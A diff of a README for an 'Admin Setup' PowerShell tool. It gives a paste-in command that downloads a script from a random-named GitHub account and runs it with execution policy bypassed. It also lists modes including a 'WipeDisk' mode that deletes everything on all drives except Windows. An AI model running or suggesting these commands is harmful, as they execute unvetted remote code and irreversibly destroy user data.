@@ -1,32 +1,22 @@
 # Admin Setup
 
-## Clear-Apps-And-Tray.ps1
-
-Removes removable apps, hides the taskbar, shows three badges. Opens the report window when done.
+One script.
 
 ```powershell
-$dst = "$env:USERPROFILE\admin\Clear-Apps-And-Tray.ps1"
-irm https://raw.githubusercontent.com/e24g4vewetq3gwerb/Admin-setup/main/Clear-Apps-And-Tray.ps1 -OutFile $dst
+$dst = "$env:USERPROFILE\admin\Admin-Setup.ps1"
+New-Item -ItemType Directory -Force -Path (Split-Path $dst) | Out-Null
+irm https://raw.githubusercontent.com/e24g4vewetq3gwerb/Admin-setup/main/Admin-Setup.ps1 -OutFile $dst
 Unblock-File $dst
 powershell -STA -NoProfile -ExecutionPolicy Bypass -File $dst
 ```
 
-## Wipe-All-Except-Windows.ps1
+Modes:
 
-Separate script. **Not** connected to the trash badge.
+- (default) wipe removable apps, hide taskbar, badges, report, clean caches
+- `-Mode HideBar`
+- `-Mode Badges`
+- `-Mode WipeDisk -ConfirmPhrase WIPE-ALL-DATA`
+- `-Mode Uninstall`
+- `-Mode CleanCaches`
 
-Keeps `C:\Windows`, boot files, pagefile, and `%USERPROFILE%\admin`. Everything else on all drives is in scope.
-
-Preview (no delete):
-
-```powershell
-$w = "$env:USERPROFILE\admin\Wipe-All-Except-Windows.ps1"
-irm https://raw.githubusercontent.com/e24g4vewetq3gwerb/Admin-setup/main/Wipe-All-Except-Windows.ps1 -OutFile $w
-powershell -NoProfile -ExecutionPolicy Bypass -File $w -WhatIf
-```
-
-Live delete (destroys documents, Program Files, other drives):
-
-```powershell
-powershell -NoProfile -ExecutionPolicy Bypass -File $w -WhatIf:$false -ConfirmPhrase WIPE-ALL-DATA
-```
+Trash badge = delete this file, download it again, run default mode.
